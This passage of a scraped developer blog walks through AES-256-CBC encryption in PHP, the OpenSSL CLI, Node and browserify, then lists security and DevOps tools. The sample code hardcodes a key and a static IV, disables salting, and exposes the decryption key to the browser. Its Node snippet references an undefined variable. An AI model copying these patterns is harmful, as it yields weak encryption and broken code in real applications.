OPENSSL\n\nIn PHP 7 we make use of the `openssl_encrypt` implementation to encrypt an utf8 string and finally encode it with `base64_encode`.\nFor decryption we also make use of the official openssl implementation `openssl_decrypt`, before decrypting we need to decode using `base64_decode`.\n\n```php\n/**********************************************************************\n*\n*        ENCRYPTION \u0026 DECRYPTION MODULE FOR PHP7+ USING OPENSSL       *\n*\n***********************************************************************/\n\nclass AESEncryption {\n\n   //key length should be 256 bits for aes 256 this means we use a string with 32 bytes\n   public static $key = \"5f08e0ec585393a8e2ca8f0a1a0ae752\";\n\n    //iv length should be always be 128 bit / 16 bytes\n   public static $iv = \"05d387e7f773035a\";\n\n    // The AES uses a block size of sixteen octets (128 bits)\n   public static $Method = 'AES-256-CBC';\n\n   /**\n     * use the AES to encrypt plaintext data and return a base 64 string\n    *\n    * $key\n    */\n   public static function encrypt($cleartext,$key = ''){\n\n       $key = empty($key) ? self::$key : $key;\n\n       $encrypted = openssl_encrypt($cleartext, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);\n\n       return base64_encode($encrypted);\n\n   }\n\n   /**\n     * use the AES to decrypt a base 64 string into plaintext\n    *\n    * $key\n    */\n   public static function decrypt($encrypted,$key = ''){\n\n       $key = empty($key) ? self::$key : $key;\n\n       $encrypted = base64_decode($encrypted);\n\n       $decrypted = openssl_decrypt($encrypted, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);\n\n       return trim($decrypted);\n   }\n}\n```\n\n\u003e while desperately searching for a solution I looked into doing the encryption in PHP instead of openssl, since I scrapped this idea I cannot explain any further. I still keep this PHP 7 example here because its hard to find examples online that don’t use mcrypt.\n\n## Using OpenSSL for use in CLI\n\nInside of a Command Line Interface, we use `openssl` do en- or decrypt data.\n\nFor node/browserify to be able to decrypt it we need to add the `-nosalt` option, which disables salting the data.\n\n```bash\n#########################################################################################\n#                                                                                       #\n#               ENCRYPTION FOR CLI IN / MACOS / LINUX / WINDOWS                         #\n#                                                                                       #\n#########################################################################################\n\n#encrypt with key \u0026 IV but no salt\ncat config.json | openssl aes-256-cbc -iv $(cat iv)  -K $(cat key) -A -nosalt -base64\n\n#decrypt with key IV and base64\necho \"encryptedString\" | openssl aes-256-cbc -d -iv $(cat iv)  -K $(cat key) -base64 -A\n```\n\n### testing the implementation\n\nI created a json file called `test.json` containing the inputData. so when we run the following command ...\n\n```bash\ncat test.json | openssl aes-256-cbc -iv \"1d6ef201e0e7a9019ddf8414034325e2\"  -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -nosalt\n```\n\nWe get no warnings and an output like this:\n\n- **`OUTPUT`** = g??.G?٪a?W????ԝFv?? 0P0+v?'???R=CR??a? ?5!??N?\"?e?q?M{C\\??:u-?wH?? ` //weird looking binary data`\n\nas you can see this is not very usefull so we apply the base64 encoding after encryption\n\n```bash\ncat test.json | openssl aes-256-cbc -iv \"1d6ef201e0e7a9019ddf8414034325e2\"  -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -nosalt -base64\n```\n\n- **`OUTPUT_base64`** = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg= ` //now this looks nice`\n\nnow we can also decrypt the just created data like so\n\n```bash\necho $encryptedData | openssl aes-256-cbc -d -iv \"1d6ef201e0e7a9019ddf8414034325e2\" -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -base64\n```\n\nThis yields us this output\n\n- **`OUTPUT`** = {\"TestData\":\"w17h Spé^cIäl chàær§¢tèrs\", \"OK\":\"://seems/fine?x=lol\"} ` //yes, thats our original input! :)`\n\n# final solution\n\n## Using NodeJS during initial build\n\nWhile building our app this code is responsible for:\n\n- creating a unique `key` on every build\n- creating a unique `iv` for every object to be encrypted\n- outputting an encrypted base64 encoded string of data\n\nthe output needs to be consumed by either:\n\n- the application during runtime (browserify implementation)\n- openssl in case of deployment\n\n```javascript\nconst crypto = require(\"crypto\");\n\n/**********************************************************************\n *\n *        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *\n *\n ***********************************************************************/\n\nconst encryption = (\n  data = { TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\" }\n) =\u003e {\n  const secretPhrase = crypto.randomBytes(16).toString(\"hex\");\n  const salt = crypto.randomBytes(128 / 8).toString(\"hex\");\n  //here we generate the key and give it back as a string, we use 100k iterations\n  //as suggested in best practices\n  //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use\n  //the same initialization vector twice\n  //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters it is currently of type Buffer\n  const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, \"sha256\");\n  //create unique IV for each encryption, the key can be reused. IV needs to always be 16 bytes. it is currently of type buffer\n  const IV = crypto.randomBytes(16);\n\n  //create ciphers for each encryption using the shared key and the unuique IV\n  const projectConfigCipher = crypto.createCipheriv(\n    \"aes-256-cbc\",\n    configKey,\n    IV\n  );\n  //when using hex strings as IV/keys you can convert it into a buffer to make it work:\n  //Buffer.from('1d6ef201e0e7a9019ddf8414034325e2','hex')\n\n  //encrypting the storage location using the prepared cipher\n  // our input is an object, so we first stringify it and set the input encoding to utf8, for our output we need base64 encoding\n  let encrypted = projectConfigCipher.update(\n    JSON.stringify(data),\n    \"utf8\",\n    \"base64\"\n  );\n  // finalize the encryption also with base64 output encoding\n  encrypted += projectConfigCipher.final(\"base64\");\n\n  /***************************************************************\n   * To be able to decrypt later, we need to save the IV and key somewhere.\n   * it is recommended to store the iv together with the encrypted\n   * data, but you should store the key separately. we save those values\n   *  as hex-encoded strings - so the can later be converted into binary again\n   ****************************************************************/\n  const saveKey = key.toString(\"hex\");\n  const saveIV = IV.toString(\"hex\");\n  // the above strings can be directly interpreted by openssl\n  // the above key can be converted to a buffer in node: Buffer.from(saveKey, 'hex')\n  // the above key can be converted to binary using hexToBin() in the browser\n\n  return encrypted;\n};\n```\n\n- **`OUTPUT_DATA`** = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUSgCV12rE4RpgPdjXMJJB2vNJZ+00LvE9nkn77fW0pf8c/tzW5MxQpzqV3A+HvniM= ` //look what a nice base64 string`\n- **`OUTPUT_KEY`** = '5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9'\n- **`OUTPUT_IV`** = '1d6ef201e0e7a9019ddf8414034325e2'\n\nOur output data looks good, so lets test what openssl can do with it!\n\n## Using Node.crypto's output as input in openssl\n\nfrom node, we get the data shown above as files named _key_ and _iv_\nIn my use case we only need the `key` and `IV` to encrypt a new config. I still did include a decryption example as well here.\n\nThings to keep in mind:\n\n- output encoding must be base64\n- `-nosalt` option needs to be enabled\n- `-A` option needs to be enabled\n\n```bash\n#########################################################################################\n#                                                                                       #\n#               ENCRYPTION FOR CLI IN / MACOS / LINUX / WINDOWS                         #\n#                                                                                       #\n#########################################################################################\n\n#encrypt with key \u0026 IV but no salt\n#config.json contains the testdata defined above\ncat config.json | openssl aes-256-cbc -iv $(cat iv)  -K $(cat key) -A -nosalt -base64\n\n#decrypt with key IV and base64\n# we use the output base64 string from node here\necho \"Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUSgCV12rE4RpgPdjXMJJB2vNJZ+00LvE9nkn77fW0pf8c/tzW5MxQpzqV3A+HvniM=\" | openssl aes-256-cbc -d -iv $(cat iv)  -K $(cat key) -base64 -A\n```\n\n### Encryption output:\n\n- **`OUTPUT_encrypt`** = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg= `//looking good..`\n\n### Decryption output:\n\n- **`OUTPUT_decrypt`** = {\"TestData\":\"w17h Spé^cIäl chàær§¢tèrs\",\"OK\":\"://seems/fine?x=lol\"} ` //nice, thats our original data!`\n\nSince our Output looks good and even the decryption worked fine, lets test what our browserify implementation can do with this.\n\n## Using browserify to decrypt node or openssl input\n\nThis code expects the following input:\n\n- base64 encoded string to decrypt\n- iv in the form of a hex-encoded string\n- key in the form of a hex-encoded string\n\nI get the keys from process.env in this example. You could also receive them via input or even a file.\n\nThis code needs to be able to produce consistent output when receiving input from either node or openssl.\n\nWe had to create a custom function `hexToBin()` to convert a hex string into a binary array to be consumed by our cipher.\n\n```js\nimport crypto from \"browserify-aes\";\n\n/**********************************************************************\n *\n *        DECRYPTION MODULE FOR USE IN BROWSER DURING RUNTIME          *\n *\n ***********************************************************************/\nconst decrypt = (Base64Hash) =\u003e {\n  const Key = process.env.APP_KEY; //hex encoded string\n  const IV = process.env.APP_IV; //hex encoded string\n\n  const hexToBin = (hex) =\u003e {\n    //converts hex strings to binary arr\n    for (var bytes = [], c = 0; c \u003c hex.length; c += 2) {\n      bytes.push(parseInt(hex.substr(c, 2), 16));\n    }\n    return bytes;\n  };\n\n  //ein neuer cipher wird vorbereitet, mittels aes256, unserem 256 bit KEY und dem config IV\n  const decipher = crypto.createDecipheriv(\n    \"aes256\",\n    hexToBin(Key),\n    hexToBin(IV)\n  );\n\n  //der hash wird nun decrypted mittels dem zuvor erstellten cipher\n  const decrypted = Buffer.concat([\n    decipher.update(Buffer.from(Base64Hash, \"base64\")),\n    decipher.final(),\n  ]).toString(\"utf8\");\n\n  return JSON.parse(decrypted);\n};\n```\n\n- **`OUTPUT_openssl`** = {TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\"} ` //yes, thats our original input! :D`\n- **`OUTPUT_nodejs`** = {TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\"} ` //and we even handled the node version! sick!`\n\nThat's it! We did it yay!\n\n\u003e Feel free to comment and discuss on my gist: \u003ca href=\"https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a\"\u003eThis project on gist\u003c/a\u003e\n"},{"path":"blog/Sick-Security-and-Dev-Tools","title":"A Collection of useful Security and DevOps tools.","subtitle":null,"published":true,"datePublished":1600786088187,"tags":["tools","devtools","security","javascript","devops"],"description":"a collection of useful, special, or just cool tools to use and try to get more done in less time.","canonicalUrl":"https://dev.lwlx.xyz/blog/Sick-Security-and-Dev-Tools","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/sicktools-sec-devops","thumbnailPhoto":"/sicktools-sec-devops-thumb.jpg","content":"\n## AppSec Tools\n\n- [x] [lynis](https://github.com/CISOfy/lynis) | `active` |: Security auditing tool for Linux, macOS, and UNIX-based systems\n- [ ] [killcord](https://github.com/nomasters/killcord) | **`new`** |: a censorship resistant deadman's switch\n- [x] [OWASP ZAP](https://github.com/zaproxy/zaproxy) | `active` |: autodetect security vulnerabilities in your web applications while developing and testing your applications\n- [ ] [ClamAV](https://github.com/Cisco-Talos/clamav-faq) | **`new`** |: open source antivirus engine for detecting trojans, viruses, malware \u0026 other malicious threats.\n- [ ] [endlessh](https://github.com/skeeto/endlessh) | **`new`** |: Endlessh is an SSH tarpit (honeypot) that very slowly sends an endless, random SSH banner\n\n---\n\n## Automation Tools\n\n- [ ]\n\n---\n\n## developer Tools\n\n- [x] [(js-) IPFS](https://github.com/ipfs/js-ipfs) | `active` |: A peer-to-peer hypermedia protocol\n      designed to make the web faster, safer, and more open.\n- [ ] [ML5.js](https://github.com/ml5js/ml5-library) | _tested_ |: Friendly \u0026 easy to use machine learning for the web!\n- [ ] [TensorFlow](https://github.com/tensorflow) | **`new`** |: Open Source Machine Learning Framework (With extensive docs and big community)\n- [ ] [deno](https://github.com/denoland/deno) | _testing_ |: Deno aims to provide a productive and secure scripting environment for the modern programmer. It is built on top of V8, Rust, and TypeScript.\n- [x] [PNPM](https://github.com/pnpm/pnpm) | _testing_ |: Faster, disk space efficient package manager, with good monorepo support.\n- [ ] [verdaccio](https://verdaccio.org/) | **`new`** |: A lightweight open source private npm proxy registry\n- [ ] [caprover](https://github.com/caprover/caprover) | **`new`** |: Easiest app/database deployment platform and webserver package for your NodeJS, Python, PHP, Ruby, Go applications. No Docker, nginx knowledge required!\n\n---\n\n## misc Tools\n\n- [x] [Chrome Galvanizer](https://thehackerblog.com/galvanizer/) | _tested_ |: Harden your Chrome browser via enterprise policy.\n- [ ] [Cursed Chrome](https://github.com/mandatoryprogrammer/CursedChrome) | **`new`** |: Chrome-extension implant that turns victim Chrome browsers into fully-functional HTTP proxies, allowing you to browse sites as your victims.\n- [x] [NMAP](https://github.com/nmap/nmap) | `active` |: The #1 network scanner \u0026 mapper\n- [x] [nmap-vulners](https://github.com/vulnersCom/nmap-vulners) | `active` |: extension to NMAP that chekcs for more known vulns\n- [ ] [lesspass](https://github.com/lesspass/lesspass) | **`new`** |: stateless open source password manager\n- [ ] [GrantProxy](https://grantproxy.com/) | **`new`** |: Turn your web browser into a magic proxy server in one click.\n- [ ] [ohmyzsh](https://github.com/ohmyzsh/ohmyzsh) | **`new`** |: A delightful community-driven framework for managing your zsh configuration. Includes 200+ plugins\n\n---\n\n# sickGuides\n\na collection of useful guides or tutorials to stay safe.\n\n## Security Guides\n\n- [x] [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) | `active` |: These cheat sheets were created by various application security professionals who have expertise in specific topics.\n- [ ] [PortSwigger XSS CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | `active` |: An extensive list of known XSS vulns, sortable and searchable\n\n---\n\n## Dev Guides\n\n- [ ] [HTMLHEAD.dev](https://htmlhead.dev/) : A free guide to HTML5 \u003chead\u003e elements\n- [ ] [CSS FlexBox Cheatsheet](https://css-tricks.com/snippets/css/a-guide-to-flexbox/) | `active` |: the only CSS flexbox cheatsheet you'll need\n- [x] [DevDocs.io](https://devdocs.io/) | `active` |: Huge, fast, searchable reporsitory for dev documentation, from java to docker, from rust to WordPress.\n- [ ] [Set Up a Private NPM Registry Locally](https://blog.bitsrc.io/how-to-set-up-a-private-npm-registry-locally-1065e6790796) | _tested_ |: using verdaccio to setup local NPM registry.\n- [ ] [Grepper](https://www.codegrepper.com/index.php) | **`new`** |: Accrue code answers to common coding problems, find code answers without thinking - using Greppers “code problem” search engine.\n\n---\n\n### Sources\n\n- [`OWASP`](https://owasp.org/) — The Open Source Web Application Security Protocol\n- [`Matthew Bryant`](https://github.com/mandatoryprogrammer/) — XSSHunter / chrome galvanizer\n- [`lwlx`](https://skills.rendered.ch) — lwlx\n\n## License\n\n[The MIT License](LICENSE).\n\n- `- [ ] ([tool name](\u003clink\u003e)|*tested*|**`new`**|deprecated| `active`): \u003cdescription\u003e `\n"}]},"__N_SSG":true},"page":"/","query":{},"buildId":"cNGqzfdWNKnrcANVGsS_G","isFallback":false,"dynamicIds":[5478],"gsp":true,"scriptLoader":[]}</script></body></html>